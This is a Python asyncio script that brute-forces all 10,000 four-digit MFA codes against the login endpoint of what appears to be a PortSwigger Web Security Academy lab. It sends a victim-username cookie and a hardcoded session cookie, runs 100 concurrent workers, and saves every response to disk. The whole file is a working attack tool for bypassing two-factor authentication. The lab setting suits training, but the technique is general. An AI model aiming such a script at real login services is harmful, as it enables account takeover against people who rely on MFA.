import asyncio
import aiohttp
import random
import time
from colorama import init, Fore, Style
import aiofiles
import os
import json

# pip install -r requirements.txt

tested = 0
hits = 0
cpm = []

semaphore_tested = asyncio.Semaphore(1)
semaphore_hits = asyncio.Semaphore(1)
semaphore_cpm = asyncio.Semaphore(1)

init(autoreset=True) 

async def get_tested():
    global tested
    async with semaphore_tested:
        return tested

async def get_hits():
    global hits
    async with semaphore_hits:
        return hits

async def get_cpm():
    global cpm
    async with semaphore_cpm:
        current_timestamp = time.time()
        cpm = [t for t in cpm if t > (current_timestamp-60)]
        return len(cpm)

async def show_results():    
    tested_old = 0
    hits_old = 0
    cpm_old = []
    
    while True:
        tested_now = await get_tested()
        hits_now = await get_hits()
        cpm_now = await get_cpm()

        if tested_now != tested_old or hits_now!=hits_old or  cpm_now!=cpm_old:
            print("\033[2J\033[H", end="", flush=True)
            print(f"Tested: {tested_now} \n{Fore.GREEN}Hits: {hits_now}\n{Fore.YELLOW}CPM: {cpm_now}{Style.RESET_ALL}", end="", flush=True)
            tested_old =tested_now
            hits_old = hits_now
            cpm_old = cpm_now
        await asyncio.sleep(1)

async def increase_tested():
    global tested
    async with semaphore_tested:
        tested=tested+1

async def increase_hits():
    global hits
    async with semaphore_hits:
        hits=hits+1

async def increase_cpm():
    global cpm
    async with semaphore_cpm:
        current_timestamp = time.time()
        cpm.append(current_timestamp)

# ------------------------------------------------------------------------------

current_path  = os.path.dirname(os.path.realpath(__file__)) 

if not os.path.exists(os.path.join(current_path, "responses")):
    os.makedirs(os.path.join(current_path, "responses"))

async def save_token(token,status,data):
    global current_path
    full_path = os.path.join(current_path, "responses",token+".json")
    
    async with aiofiles.open(full_path+".txt","w") as f:
        await f.write(str(token)+"\n"+str(status)+"\n"+str(data)+"\n")

def generate_token():
    for i in range(0,10000):
        yield str(i).zfill(4)

generator = generate_token()

async def task(session,token):
    url = f"https://0a99009c03782ace8655a3a100700035.web-security-academy.net:443/login2"
    cookies = {"verify": "carlos", "session": "vUvs137K0oapNeXqxyyBd3hEimKp8KAM"}
    headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "es-ES,es;q=0.9", "Origin": "https://0a99009c03782ace8655a3a100700035.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a99009c03782ace8655a3a100700035.web-security-academy.net/login2", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
    data = {"mfa-code": token}
    async with session.post(url, cookies=cookies, headers=headers, data=data) as response:
        text = await response.text()
        status = response.status
        await increase_hits()
        await save_token(token,status,text)
    await increase_cpm()
    await increase_tested()

async def worker(session):
    while True:
        try:
            token = next(generator)
            await task(session, token)
        except StopIteration:
            break

async def main(num_tasks):
    asyncio.create_task(show_results())

    connector = aiohttp.TCPConnector(limit=50, limit_per_host=50)
    async with aiohttp.ClientSession(connector=connector) as session:
        workers = [asyncio.create_task(worker(session)) for _ in range(num_tasks)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    num_tasks = 100
    asyncio.run(main(num_tasks))
